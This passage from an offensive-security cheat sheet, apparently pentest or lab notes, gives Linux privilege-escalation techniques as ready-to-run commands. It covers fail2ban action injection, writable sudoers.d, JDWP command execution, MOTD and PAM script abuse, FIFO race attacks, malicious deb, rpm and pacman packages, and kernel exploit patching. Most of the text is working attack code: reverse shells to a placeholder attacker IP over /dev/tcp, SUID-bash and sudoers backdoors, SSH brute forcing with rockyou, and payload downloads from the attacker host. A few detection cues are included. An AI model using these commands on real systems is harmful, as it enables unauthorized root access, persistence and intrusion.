gcc -shared -fPIC -nostartfiles -Wl,-soname,libxcb.so.1 -o /tmp/libxcb.so.1 /tmp/xcb.c
file /tmp/libxcb.so.1
```

```bash
# === STEP 4: PLANT IN THE TARGET CWD ===

# Drop the malicious so where the privileged process will resolve it
cp /tmp/libxcb.so.1 <CWD_PATH>/libxcb.so.1
ls -la <CWD_PATH>/libxcb.so.1

# Optional: drop a benign image to give the cron/handler something to convert
cp /usr/share/pixmaps/*.png <CWD_PATH>/trigger.png 2>/dev/null \
  || python3 -c "open('<CWD_PATH>/trigger.png','wb').write(bytes.fromhex('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c63000100000005000100'))"
```

```bash
# === STEP 5: TRIGGER & COLLECT ===

# Wait for the cron / timer / web handler to fire
# (or trigger via the web upload form / queue submission)
while true; do ls -la /tmp/.rb 2>/dev/null && break; sleep 5; done

# Collect privilege
/tmp/.rb -p
id
# uid=0(root) gid=0(root)

# OPSEC — at end of engagement, remove planted so + marker
# (per offsec-engagement-rules: marker proves access, libxcb.so.1 plant is the exploit artifact and should be removed in cleanup phase)
```

> **Detection cue:** legitimate ImageMagick installs resolve `libxcb.so.1` to `/usr/lib/x86_64-linux-gnu/libxcb.so.1`. Any `libxcb.so.1` in a non-system path that gets loaded by `convert`/`identify` is an IOC. EDR / AIDE / auditd `LD_AUDIT` rules can flag dlopen of shared objects from world-writable dirs.

> **Variant:** same primitive applies to any binary whose `RPATH`/`RUNPATH` contains `""`, `"."`, or `$ORIGIN/<relative>`. Always check `readelf -d <bin> | grep -E "RPATH|RUNPATH"` on every privileged / cron-invoked binary in a privesc check.

### 4.14 Fail2ban Privilege Escalation

Fail2ban runs as **root** and executes shell commands (defined in `actionban`) whenever a ban is triggered. If any action config file is **writable** by the current user, you can replace the ban command with a payload that executes as root. Classic example: writable fail2ban `action.d` in lab environments.

```bash
# === STEP 1: ENUMERATE ===

# Check fail2ban is running as root
ps auxf | grep -i fail2ban
systemctl status fail2ban

# Version (older versions have more permissive default configs)
fail2ban-client --version

# Read jail configuration — identify which jails are enabled and their settings
cat /etc/fail2ban/jail.conf
cat /etc/fail2ban/jail.local 2>/dev/null       # local overrides (takes priority)
cat /etc/fail2ban/jail.d/*.conf 2>/dev/null     # per-jail drop-in files

# Key values to note:
# - bantime   = how long the ban lasts (default 10m — your payload window)
# - maxretry  = failed attempts before ban triggers (default 5)
# - findtime  = window for counting failures (default 10m)
# - action    = which action file is used (e.g., iptables-multiport)
# - enabled   = true means the jail is active
grep -E "bantime|maxretry|findtime|action|enabled" /etc/fail2ban/jail.local 2>/dev/null

# List active jails (confirms which services are monitored)
fail2ban-client status 2>/dev/null
# Example output: Jail list: sshd
# Then check specific jail:
fail2ban-client status sshd 2>/dev/null

# === STEP 2: CHECK FOR WRITABLE ACTION FILES ===

# This is the privesc condition — if any action.d file is writable by your user/group
find /etc/fail2ban/action.d/ -writable 2>/dev/null
ls -la /etc/fail2ban/action.d/

# Check which action file the active jail uses
grep -E "^action" /etc/fail2ban/jail.local 2>/dev/null
grep -E "^banaction" /etc/fail2ban/jail.local 2>/dev/null
# Default is usually: iptables-multiport

# Read the actionban line in the relevant action file
cat /etc/fail2ban/action.d/iptables-multiport.conf | grep -A2 "actionban"
# Original typically looks like:
# actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

```bash
# === STEP 3: INJECT PAYLOAD INTO actionban ===

# Option A: SUID bash (most reliable — persists after ban expires)
# Replace the actionban line with your payload
# IMPORTANT: Overwrite the ENTIRE file with a minimal working config
cat <<'EOF' > /etc/fail2ban/action.d/iptables-multiport.conf
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
actionunban =
EOF

# Option B: Reverse shell (immediate callback as root)
cat <<'EOF' > /etc/fail2ban/action.d/iptables-multiport.conf
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
actionunban =
EOF

# Option C: Append to /etc/sudoers (persistent sudo access)
cat <<'EOF' > /etc/fail2ban/action.d/iptables-multiport.conf
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = echo '<USER> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
actionunban =
EOF

# If fail2ban monitors the action file or has auto-reload, the window is tight.
# Some setups reload configs periodically — inject + trigger quickly.
```

```bash
# === STEP 4: TRIGGER THE BAN ===

# You need to generate enough failed login attempts to hit maxretry (usually 5)
# Use nxc (netexec) SSH brute-force from your attacker machine against the TARGET

# From your attacker box — brute-force SSH with fake creds to trigger ban
nxc ssh <TARGET_IP> -u root -p /usr/share/wordlists/rockyou.txt
# This will rapidly fail authentication → fail2ban detects → triggers actionban as root

# Alternative: hydra (faster, more control over attempt count)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -f

# Alternative: manual rapid failures (if you just need 5 attempts)
for i in $(seq 1 10); do sshpass -p 'wrong' ssh -o StrictHostKeyChecking=no root@<TARGET_IP> 2>/dev/null; done

# Alternative: from the target itself (if SSH allows localhost connections)
for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no fakeuser@localhost 2>/dev/null; done

# === STEP 5: COLLECT ROOT ===

# If Option A (SUID bash):
# Wait a few seconds for fail2ban to process the ban
sleep 5
ls -la /tmp/rootbash
/tmp/rootbash -p
# uid=1001(user) gid=1001(user) euid=0(root)

# If Option B (reverse shell):
# Catch it on attacker: rlwrap nc -nlvp <PORT>

# If Option C (sudoers):
sudo su
```

> **Timing:** Fail2ban may **reload** action configs periodically or on service restart, reverting your changes. The attack chain is: **(1)** overwrite actionban → **(2)** immediately trigger ban from attacker box → **(3)** payload fires as root. If the config reverts before you trigger, re-inject and retry. The window between write and trigger must be fast.

> **Detection check:** `fail2ban-client status sshd` shows currently banned IPs. If your attacker IP appears → the ban fired → your payload executed. If `maxretry` is high or `findtime` is short, adjust your brute-force speed accordingly.

### 4.14b Logrotate Privilege Escalation (logrotten)
```bash
# Check logrotate version
logrotate --version
# Vulnerable: logrotate < 3.15.1 (race condition — no specific CVE assigned)

# Requires: write access to a log file that logrotate processes
# Check which logs are rotated:
cat /etc/logrotate.conf
ls -la /etc/logrotate.d/

# If you can write to a log file that root's logrotate processes:
# 1. Compile logrotten
# https://github.com/whotwagner/logrotten
gcc logrotten.c -o logrotten

# 2. Create payload
echo '#!/bin/bash' > /tmp/payload
echo 'chmod +s /bin/bash' >> /tmp/payload
chmod +x /tmp/payload

# 3. Run logrotten targeting the writable log
./logrotten -p /tmp/payload /path/to/writable.log

# 4. Trigger log rotation (write to log to fill it, or wait)
# After rotation: /bin/bash -p
```

### 4.14c Writable /etc/sudoers.d
```bash
# Check if /etc/sudoers.d/ or any file inside is writable
ls -la /etc/sudoers.d/ 2>/dev/null
find /etc/sudoers.d/ -writable 2>/dev/null

# If writable — add sudo rule for your user
echo '<USER> ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/privesc
sudo su
```

### 4.14d Polkit / pkaction Audit

`polkit` (formerly PolicyKit) gates privileged actions for unprivileged users via `actions/*.policy` and `rules.d/*.rules`. A misconfigured action with `<allow_active>yes</allow_active>` (or a rules file that returns `polkit.Result.YES` too liberally) is a direct privilege escalation primitive. PwnKit (CVE-2021-4034) is the well-known SUID flaw; misconfigured *actions* are the under-audited variant.

```bash
# Enumerate every registered polkit action with its allow_* matrix
pkaction --verbose
# Look for: implicit any=auth_admin / inactive=auth_admin / active=yes
# 'active=yes' means any locally-active session can invoke it without auth

# Filter to high-impact actions
pkaction --verbose 2>/dev/null | awk '
  /^[^ ]/ {action=$0}
  /implicit active:/ {print action " -> " $0}' | grep -i 'yes'

# Inspect a specific action
pkaction --action-id <ACTION_ID> --verbose

# Look for risky implicit grants directly in the policy XML
grep -rE '<allow_active>(yes|auth_self_keep)</allow_active>' /usr/share/polkit-1/actions/ 2>/dev/null
grep -rE '<allow_any>yes</allow_any>'                          /usr/share/polkit-1/actions/ 2>/dev/null

# Read every rules.d file (JavaScript-like rules can override action defaults)
ls -la /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/
cat /etc/polkit-1/rules.d/*.rules 2>/dev/null
# Search for: polkit.Result.YES, return polkit.Result.YES (especially gated only by group/uid)

# Enumerate which actions the current user can run unprompted
pkcheck --action-id org.freedesktop.<ACTION> --process $$ -u 2>&1
# Run in a loop against pkaction list

# Trigger a candidate privileged action
pkexec --version          # PwnKit (CVE-2021-4034) sanity check
pkexec /bin/bash          # if any action grants shell-spawning binary

# When polkit action allows mounting/managing services unprompted, abuse via:
busctl call org.freedesktop.PolicyKit1 /org/freedesktop/PolicyKit1/Authority \
  org.freedesktop.PolicyKit1.Authority CheckAuthorization \
  '(sa{sv})sa{ss}us' 'unix-process' 1 pid u <PID> 0 '<ACTION>' 0 0 ''
```

> Cross-link: PwnKit (CVE-2021-4034) full exploitation in **4.7 — Qualys TRU Arsenal** above.

### 4.14e D-Bus Service Enumeration

Privileged daemons (systemd-resolved, NetworkManager, systemd-machined, accounts-daemon, snapd, polkit itself) expose D-Bus methods that may be reachable by unprivileged users. Look for unprivileged → privileged method calls (the same pattern as polkit, but at the IPC layer).

```bash
# Enumerate every system-bus service
busctl list
busctl list --acquired                     # active services only
busctl list --no-pager | awk '$1 !~ /^:/ { print $1 }' | sort -u

# Drill into one service — introspect every object/interface/method
busctl introspect <SERVICE> /
busctl tree <SERVICE>
busctl introspect org.freedesktop.systemd1 /org/freedesktop/systemd1

# Same with gdbus (often present when busctl isn't)
gdbus introspect --system --dest <SERVICE> --object-path /
gdbus introspect --system --dest org.freedesktop.systemd1 --object-path /org/freedesktop/systemd1

# Call a method — syntax: <SERVICE> <OBJECT> <INTERFACE>.<METHOD> [signature args]
dbus-send --system --print-reply --dest=<SERVICE> <OBJECT> <INTERFACE>.<METHOD>

# Example: list all systemd units (no privileges required)
dbus-send --system --print-reply --dest=org.freedesktop.systemd1 \
  /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.ListUnits

# Example: ask accounts-daemon for every local user (often readable)
dbus-send --system --print-reply --dest=org.freedesktop.Accounts \
  /org/freedesktop/Accounts org.freedesktop.Accounts.ListCachedUsers

# Spot privileged-looking method names that take a path/command argument
busctl introspect <SERVICE> <OBJECT> 2>/dev/null | \
  grep -E '\.method.*\b(Run|Execute|Start|Reload|Set|Write|Create|Install|Enable)\b'

# Audit which interfaces the current user can actually invoke
for svc in $(busctl list --no-pager --acquired | awk 'NR>1{print $1}'); do
  echo "=== $svc ==="
  busctl introspect "$svc" / 2>/dev/null | grep -E '^\.[A-Za-z]+ +method'
done
```

**LOTL — raw socket inspection (no `busctl`/`gdbus` available):**
```bash
# System bus socket — readable by all by default
ls -l /var/run/dbus/system_bus_socket
# Send a Hello message via socat to confirm reachability
echo -ne 'AUTH EXTERNAL 30\r\nBEGIN\r\n' | socat - UNIX-CONNECT:/var/run/dbus/system_bus_socket
```

> Look for daemons running as root that expose `org.freedesktop.<svc>.Manager.Run*` / `Execute*` / `SetProperty` methods without polkit gating — those are direct LPE vectors.

### 4.15 Internal Service Enumeration (Post-Foothold)
```bash
# Find services listening only on localhost (invisible from outside)
ss -tulnp | grep "127.0.0.1"
netstat -tulnp 2>/dev/null | grep "127.0.0.1"

# Common internal-only services:
# MySQL (3306), Redis (6379), PostgreSQL (5432), Memcached (11211)
# Web admin panels (8080, 8443, 9090, 3000)
# Docker API (2375), Kubernetes (6443, 10250)

# Forward internal services for further exploitation
# See: [Tunneling & Pivoting](tunneling-pivoting.md) for SSH local port forwarding
ssh -L <LOCAL_PORT>:127.0.0.1:<INTERNAL_PORT> user@<TARGET>

# Check running processes for services with credentials
ps auxf | grep -i "mysql\|redis\|postgres\|mongo\|apache\|nginx"
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -i "password\|pass\|token"
```

### 4.15b Egress Posture Enumeration — Firewall Rule Analysis + Shell Type Decision

After foothold, determine what outbound traffic is allowed to choose the right exfil/C2 channel: reverse shell (egress TCP), bind shell (ingress TCP), or OOB DNS/ICMP.

```bash
# === ENUMERATE FIREWALL RULES (run all — one will work) ===

# iptables (legacy)
iptables -L -n -v 2>/dev/null
iptables -L OUTPUT -n -v 2>/dev/null          # OUTPUT chain = egress rules
iptables-save 2>/dev/null                      # full ruleset in iptables-restore format

# nftables (modern replacement)
nft list ruleset 2>/dev/null

# ufw (Ubuntu frontend)
ufw status verbose 2>/dev/null

# firewalld (RHEL/CentOS)
firewall-cmd --list-all 2>/dev/null
firewall-cmd --list-ports 2>/dev/null
firewall-cmd --get-active-zones 2>/dev/null

# Saved rules files
cat /etc/iptables/rules.v4 2>/dev/null
cat /etc/iptables/rules.v6 2>/dev/null
cat /etc/nftables.conf 2>/dev/null
cat /etc/sysconfig/iptables 2>/dev/null        # RHEL/CentOS
```

```bash
# === INTERPRET OUTPUT CHAIN — decision matrix ===
# OUTPUT policy ACCEPT + no DROP rules → reverse shell on any port works
# OUTPUT allows TCP 80,443 only → reverse shell on 80 or 443
# OUTPUT allows DNS (UDP 53) only → DNS tunnel (dnscat2, iodine)
# OUTPUT DROP all → bind shell (requires ingress allowed) or DNS/ICMP OOB
# No iptables/nft output → likely no host firewall (cloud SG may still block)

# Quick egress test (from target — does traffic reach attacker?)
# On attacker: nc -lvnp 443
# On target:
bash -c 'echo test > /dev/tcp/<ATTACKER_IP>/443' 2>/dev/null && echo "TCP 443 EGRESS OK"
bash -c 'echo test > /dev/tcp/<ATTACKER_IP>/80' 2>/dev/null && echo "TCP 80 EGRESS OK"
bash -c 'echo test > /dev/tcp/<ATTACKER_IP>/53' 2>/dev/null && echo "TCP 53 EGRESS OK"

# DNS egress test (almost never blocked)
nslookup egress-test.<ATTACKER_DNS> 2>/dev/null
host egress-test.<ATTACKER_DNS> 2>/dev/null
dig egress-test.<ATTACKER_DNS> 2>/dev/null
```

```bash
# === DECISION MATRIX ===
# Egress open (any port) → bash reverse shell (see Quick Reference: Reverse Shells)
# Egress 80/443 only → reverse shell on those ports, or socat/chisel over HTTPS
# Egress DNS only → dnscat2, iodine, dns2tcp
# Egress ICMP only → icmpsh, hans
# No egress at all → bind shell on open inbound port, or data-only OOB via DNS TXT
# For pivoting/tunneling details → see tunneling-pivoting.md
```

#### Living-off-the-land / LOTL variant

```bash
# All commands above are LOTL — iptables, nft, ufw, firewall-cmd, cat, bash /dev/tcp
# The /dev/tcp egress test uses bash built-in (no netcat/curl needed)
# For systems without bash: use /dev/udp or printf to /proc/net/tcp to read connection state
cat /proc/net/tcp | awk '{print $2}' | grep -v local   # view established connections
```

### 4.15c JDWP (Java Debug Wire Protocol) Exploitation

When a root-owned Java process exposes JDWP (typically port 5005 or 8000, detected via `-agentlib:jdwp` in process args), attach with `jdb` and execute arbitrary commands as the process owner.

```bash
# Detect — find JDWP-enabled Java processes
ps auxf | grep -E "\-agentlib:jdwp|dt_socket"
ss -tlnp | grep -E "5005|8000|8787"
# Example: root 1234 java -agentlib:jdwp=transport=dt_socket,server=y,address=5005 -jar app.jar
```

```bash
# Method 1: jdb (ships with JDK) — interactive debugger
jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=<JDWP_PORT>

# Inside jdb — set breakpoint on a method that will be called (Thread.sleep is reliable)
> threads                                        # list threads
> thread <THREAD_ID>                            # select a thread
> suspend <THREAD_ID>                           # pause it
> print new java.lang.Runtime().exec("id")      # test command execution
> print new java.lang.Runtime().exec(new String[]{"/bin/bash","-c","cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"})

# If exec() hangs (common), use ProcessBuilder instead:
> print new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"}).start()

# Exit jdb, collect root shell
> quit
/tmp/rootbash -p
```

```bash
# Method 2: One-liner via jdb -sourcepath (non-interactive, scriptable)
echo 'print new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"}).start()' | \
  jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=<JDWP_PORT>
sleep 2; /tmp/rootbash -p
```

```bash
# Method 3: Reverse shell via JDWP
# In jdb:
> print new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"}).start()
```

#### Living-off-the-land / LOTL variant

```bash
# jdb ships with any JDK installation (likely present if Java app is running)
which jdb 2>/dev/null
find / -name "jdb" 2>/dev/null
# If jdb not available but python3 is:
# Use a raw JDWP protocol script (handshake + command packets over TCP)
# The JDWP handshake is: client sends "JDWP-Handshake" (14 bytes), server echoes same
python3 -c '
import socket
s = socket.socket()
s.connect(("127.0.0.1", <JDWP_PORT>))
s.send(b"JDWP-Handshake")
print(s.recv(14))  # confirms JDWP is alive
s.close()
'
# Full exploitation without jdb requires implementing JDWP packet protocol — use jdb when possible
```

### 4.15d Kernel-Exploit PoC Modification — Patching Hardcoded Paths and Cross-Compilation

When a kernel exploit PoC targets a different distro (hardcoded `/etc/lsb-release` paths, wrong libc offsets, distro-specific struct offsets), patch it for the target before attempting exploitation. Also covers cross-compilation when the target lacks gcc.

```bash
# Step 1: Verify target kernel and distro vs PoC assumptions
uname -r
cat /etc/os-release
ldd --version 2>&1 | head -1
# Compare against PoC's README/comments for assumed distro/kernel/libc

# Step 2: Common modifications needed
# A) Hardcoded paths (many PoCs check /etc/lsb-release, /etc/debian_version, etc.)
grep -n "/etc/" exploit.c | head -10
# If PoC checks for specific distro string, patch it or bypass the check:
sed -i 's|/etc/lsb-release|/etc/os-release|g' exploit.c
# Or simply comment out the distro check if you've verified kernel version matches

# B) Libc offsets (Baron Samedit, stack-based exploits)
ldd /usr/bin/sudo 2>/dev/null | grep libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system$| execve$'
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
# Patch offset values in the PoC source

# C) Struct offsets (kernel exploits — task_struct, cred, etc.)
# If PoC provides a lookup script: ./get_offsets.sh
# Otherwise extract from /proc/kallsyms or System.map if readable
cat /proc/kallsyms 2>/dev/null | grep -E "commit_creds|prepare_kernel_cred"
```

```bash
# Step 3: Compile on target (if gcc available)
gcc -o exploit exploit.c -lpthread -static 2>/dev/null
# Static linking avoids runtime libc mismatch

# Step 4: Cross-compile if target lacks gcc
# On attacker (match target architecture):
# x86_64 target:
gcc -static -o exploit exploit.c -lpthread
# i386 target from x86_64 attacker:
gcc -m32 -static -o exploit exploit.c -lpthread
# ARM target:
arm-linux-gnueabihf-gcc -static -o exploit exploit.c -lpthread

# Transfer to target
# python3 -m http.server 80 (on attacker)
# wget http://<ATTACKER_IP>/exploit (on target)
chmod +x exploit && ./exploit
```

```bash
# Step 5: If target has no writable+executable filesystem (noexec /tmp, etc.)
# Run from /dev/shm (usually exec-allowed, tmpfs)
cp exploit /dev/shm/ && /dev/shm/exploit
# Or use memfd_create to run from memory (advanced)
```

#### Living-off-the-land / LOTL variant

```bash
# If target has no gcc and no way to transfer binaries:
# Some exploits have bash/python equivalents (DirtyPipe python PoC, PwnKit python)
python3 CVE-2021-4034.py        # PwnKit — no compilation needed
python3 CVE-2022-0847.py        # DirtyPipe python variant
# For C-only exploits: cross-compile statically on attacker, transfer the single binary
```

### 4.16 MOTD Privesc — Writable /etc/update-motd.d/ Scripts Run as Root on SSH Login

Scripts in `/etc/update-motd.d/` execute as root every time a user logs in via SSH. If any script is writable by your user (or a group you belong to), appending a command yields root execution on next login.

```bash
# Detect — check for writable MOTD scripts
ls -la /etc/update-motd.d/
find /etc/update-motd.d/ -writable 2>/dev/null
# Also check the legacy /etc/motd path (static, less useful) vs dynamic scripts

# Verify scripts run as root on login
file /etc/update-motd.d/*
head -5 /etc/update-motd.d/*
```

```bash
# Exploit — append payload to writable MOTD script
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /etc/update-motd.d/<WRITABLE_SCRIPT>

# Trigger — SSH back into the box (even as current user)
ssh <USER>@127.0.0.1
# After login banner displays: scripts fired as root
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# Only echo needed — the MOTD mechanism itself runs the script as root
# No tools, no downloads. SSH login is the trigger.
echo 'id > /tmp/motd_proof' >> /etc/update-motd.d/<WRITABLE_SCRIPT>
ssh <USER>@127.0.0.1
cat /tmp/motd_proof
```

### 4.16b mosh-server sudo NOPASSWD Privesc

When `sudo -l` shows `(root) NOPASSWD: /usr/bin/mosh-server`, mosh-server spawns a shell as root. Unlike most GTFOBins entries, mosh-server is NOT listed there — but it drops you into an interactive root shell by design because its purpose is to run a user session on the remote end.

```bash
# Detect
sudo -l | grep mosh-server

# Exploit — mosh-server spawns $SHELL (or /bin/bash) for the target user
# When run via sudo as root, it spawns a root shell
sudo /usr/bin/mosh-server new -s -- /bin/bash
# You land in an interactive root bash session

# Alternative: specify the shell explicitly
sudo /usr/bin/mosh-server new -s -- /bin/sh
```

#### Living-off-the-land / LOTL variant

```bash
# mosh-server is the only binary needed (already present if sudo allows it)
# No downloads, no compilation — it IS the shell spawner
sudo /usr/bin/mosh-server new -s -- /bin/bash -p
id
```

### 4.16c PAM Session Hook (pam_exec.so) — Writable Script Triggered on Login

If `pam_exec.so` invokes a script on session open/close and that script is writable, any appended command executes as root on next authentication event (SSH login, su, sudo).

```bash
# Detect — find pam_exec.so references with writable target scripts
grep -r "pam_exec" /etc/pam.d/ 2>/dev/null
# Example: session optional pam_exec.so /usr/local/bin/on_login.sh
# Check if the referenced script is writable
ls -la /usr/local/bin/on_login.sh
find / -name "*.sh" -path "*/pam*" 2>/dev/null

# Also check PAM config for any script paths
grep -rE "exec|script" /etc/pam.d/ 2>/dev/null
```

```bash
# Exploit — append to writable pam_exec script
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <PAM_EXEC_SCRIPT_PATH>

# Trigger — any PAM session event (SSH login, su, sudo)
ssh <USER>@127.0.0.1
# Or simply: su - <USER>

/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# Pure echo — no tools needed. The PAM stack itself runs the script as root.
echo 'id > /tmp/pam_proof' >> <PAM_EXEC_SCRIPT_PATH>
# Trigger via SSH or su, then check /tmp/pam_proof
```

### 4.16d Named-Pipe TOCTOU Bypass on Hash-Checking Cron Runner

When a root cron job computes a hash of a script (integrity check) then executes it, a FIFO (named pipe) creates a race window: the hash-check reads attacker-controlled benign content, then the execute phase reads the malicious payload through the same FIFO.

```bash
# Detect — identify cron scripts that hash-check before execution
grep -rE "md5sum|sha256sum|sha1sum" /etc/cron* /var/spool/cron/ /opt/ /usr/local/bin/ 2>/dev/null
# Pattern: script does `hash=$(sha256sum $file)` then `if [ "$hash" == "$expected" ]; then bash $file; fi`
# The file path between hash-check and execution is the TOCTOU window
```

```bash
# Exploit — replace the target file with a FIFO
rm <TARGET_SCRIPT_PATH>
mkfifo <TARGET_SCRIPT_PATH>

# Serve benign content for the hash check, then malicious content for execution
# Terminal 1 — feed the hash check (must match expected hash)
echo '#!/bin/bash' > /tmp/benign.sh
echo '# legitimate script content matching expected hash' >> /tmp/benign.sh
cat /tmp/benign.sh > <TARGET_SCRIPT_PATH>   # first reader (hash check) gets this

# Terminal 2 — feed the execution phase
echo '#!/bin/bash' > /tmp/evil.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /tmp/evil.sh
cat /tmp/evil.sh > <TARGET_SCRIPT_PATH>     # second reader (bash $file) gets this

# Automated version — loop to handle timing
while true; do
  cat /tmp/benign.sh > <TARGET_SCRIPT_PATH> 2>/dev/null
  cat /tmp/evil.sh > <TARGET_SCRIPT_PATH> 2>/dev/null
done &

# Wait for cron execution → /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# mkfifo + cat + echo are all POSIX builtins/standard utilities
# No external tools needed — the race is between two cat writes to the FIFO
mkfifo /tmp/test_fifo
echo "benign" > /tmp/test_fifo &   # demonstrates the blocking write behavior
cat /tmp/test_fifo                  # unblocks the writer
```

### 4.16e Pacman/dpkg/rpm Post-Install Hook Abuse via sudo NOPASSWD Package Manager

When `sudo -l` allows a package manager (`pacman -U`, `dpkg -i`, `apt install`, `rpm -i`) without password, craft a malicious package with a post-install script that executes as root during installation.

```bash
# Detect
sudo -l | grep -iE "pacman|dpkg|apt|rpm|yum"
```

```bash
# === Arch Linux: pacman -U with .install hook ===
# Create minimal package with post_install() hook
mkdir -p /tmp/evil-pkg
cat > /tmp/evil-pkg/.PKGINFO <<'EOF'
pkgname = pwn
pkgver = 1.0-1
pkgdesc = pwn
arch = x86_64
size = 1024
EOF

cat > /tmp/evil-pkg/.INSTALL <<'EOF'
post_install() {
  cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
}
EOF

cd /tmp/evil-pkg
tar czf /tmp/pwn-1.0-1-x86_64.pkg.tar.gz .PKGINFO .INSTALL
sudo pacman -U --noconfirm /tmp/pwn-1.0-1-x86_64.pkg.tar.gz
/tmp/rootbash -p
```

```bash
# === Debian/Ubuntu: dpkg -i with postinst script ===
mkdir -p /tmp/evil-deb/DEBIAN
cat > /tmp/evil-deb/DEBIAN/control <<'EOF'
Package: pwn
Version: 1.0
Architecture: all
Maintainer: x
Description: x
EOF

cat > /tmp/evil-deb/DEBIAN/postinst <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
chmod 755 /tmp/evil-deb/DEBIAN/postinst

dpkg-deb --build /tmp/evil-deb /tmp/pwn.deb
sudo dpkg -i /tmp/pwn.deb
/tmp/rootbash -p
```

```bash
# === RHEL/CentOS: rpm with %post scriptlet ===
mkdir -p /tmp/evil-rpm/BUILD
cat > /tmp/evil-rpm/pwn.spec <<'EOF'
Name: pwn
Version: 1.0
Release: 1
Summary: x
License: MIT
%description
x
%post
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
%files
EOF

rpmbuild --define "_topdir /tmp/evil-rpm" -bb /tmp/evil-rpm/pwn.spec
sudo rpm -i /tmp/evil-rpm/RPMS/*/pwn-1.0-1.*.rpm --nodeps
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# dpkg-deb ships with any Debian/Ubuntu system — no additional tools
# For the Debian method: mkdir + cat + chmod + dpkg-deb are all standard
mkdir -p /tmp/d/DEBIAN
printf 'Package: x\nVersion: 1\nArchitecture: all\nMaintainer: x\nDescription: x\n' > /tmp/d/DEBIAN/control
printf '#!/bin/sh\nid > /tmp/dpkg_proof\n' > /tmp/d/DEBIAN/postinst
chmod 755 /tmp/d/DEBIAN/postinst
dpkg-deb --build /tmp/d /tmp/x.deb
sudo dpkg -i /tmp/x.deb
```

### 4.16f Postfix Content-Filter Script Abuse — Writable Filter Triggered via SMTP

When Postfix uses a content_filter directive (altermime, disclaimer script) and the filter script is writable, injecting a command and sending mail triggers execution as the filter user (often root or a service account with sudo).

```bash
# Detect — find content_filter configuration
grep -i "content_filter" /etc/postfix/main.cf 2>/dev/null
grep -i "pipe" /etc/postfix/master.cf 2>/dev/null
# Look for lines like: dfilt unix - n n - - pipe user=filter argv=/usr/local/bin/disclaimer.sh
# Check if the referenced script is writable
ls -la /usr/local/bin/disclaimer.sh 2>/dev/null
find / -name "disclaimer*" -o -name "altermime*" -o -name "*filter*.sh" 2>/dev/null | xargs ls -la 2>/dev/null
```

```bash
# Identify the filter allowlist (only processes mail to/from listed addresses)
cat /etc/postfix/disclaimer_addresses 2>/dev/null
# If present, your FROM/TO must match an entry in this file

# Exploit — inject command into writable filter script
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <FILTER_SCRIPT_PATH>

# Trigger — send mail through the local Postfix instance
# Use nc to speak raw SMTP (LOTL — no sendmail/swaks needed)
{
echo "EHLO localhost"
sleep 1
echo "MAIL FROM:<USER>@<DOMAIN>"
sleep 1
echo "RCPT TO:<ALLOWED_RECIPIENT>@<DOMAIN>"
sleep 1
echo "DATA"
sleep 1
echo "Subject: trigger"
echo ""
echo "test"
echo "."
sleep 1
echo "QUIT"
} | nc 127.0.0.1 25

# Wait for filter processing → /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# echo + nc (netcat) or bash /dev/tcp for SMTP — no swaks/sendmail needed
{
printf "EHLO x\r\nMAIL FROM:<a@b>\r\nRCPT TO:<c@d>\r\nDATA\r\nSubject: x\r\n\r\nx\r\n.\r\nQUIT\r\n"
} > /dev/tcp/127.0.0.1/25
```

### 4.16g OpenSSH 7.2p1/7.2p2 xauth Command Injection (CVE-2016-3115)

When SSH `X11Forwarding` is enabled and the server runs OpenSSH 7.2p1 or 7.2p2, an authenticated user can inject commands into the xauth process. Useful for bypassing restricted shells (ForceCommand, rbash) since xauth injection fires pre-shell.

```bash
# Detect — check SSH version and X11 forwarding
ssh -V 2>&1    # client version
nc -nv <TARGET> 22 | head -1    # server banner: OpenSSH_7.2p1 or 7.2p2

# Check if X11Forwarding is enabled
grep -i "X11Forwarding" /etc/ssh/sshd_config 2>/dev/null
# Also: ssh -v -X <TARGET> shows "Requesting X11 forwarding" in debug
```

```bash
# Exploit — inject via xauth during SSH connection with -X
# The xauth cookie value is processed unsanitized — inject shell metacharacters
ssh -X <USER>@<TARGET> -o "XAuthLocation=/tmp/xauth_inject"

# Method: use ssh -o ProxyCommand to inject into the xauth protocol
# The vulnerability allows newline injection in the xauth cookie:
ssh <USER>@<TARGET> -X -v 2>&1
